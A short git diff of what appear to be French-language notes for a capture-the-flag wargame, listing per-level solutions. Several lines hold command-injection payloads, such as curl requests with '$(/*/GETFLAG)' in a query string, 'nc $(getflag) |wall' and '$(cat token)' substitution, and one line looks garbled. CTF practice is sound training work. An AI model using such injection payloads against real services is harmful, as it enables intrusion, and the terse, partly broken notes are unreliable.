@@ -18,7 +18,7 @@ echo
 
 ### Level04:
 
-Injection de code avec curl '':x
+Injection de code avec curl 'ip:4747ltra'?x
 
 
 ### Level05:
@@ -39,7 +39,8 @@ t0ken
 
 ### Level09:
 
-aaaa -> abcd $(cat token)
+aaaa -> abcd 
+python decode.py $(cat token)
 
 ### Level10
 
@@ -51,7 +52,8 @@ nc $(getflag) |wall
 
 ### Level12:
 
-/*/GETFLAG
+'getflag | wall' > /tmp/GETFLAG
+curl '127.0.0.1:4646?x=$(/*/GETFLAG)'
 
 ### Level13:
 
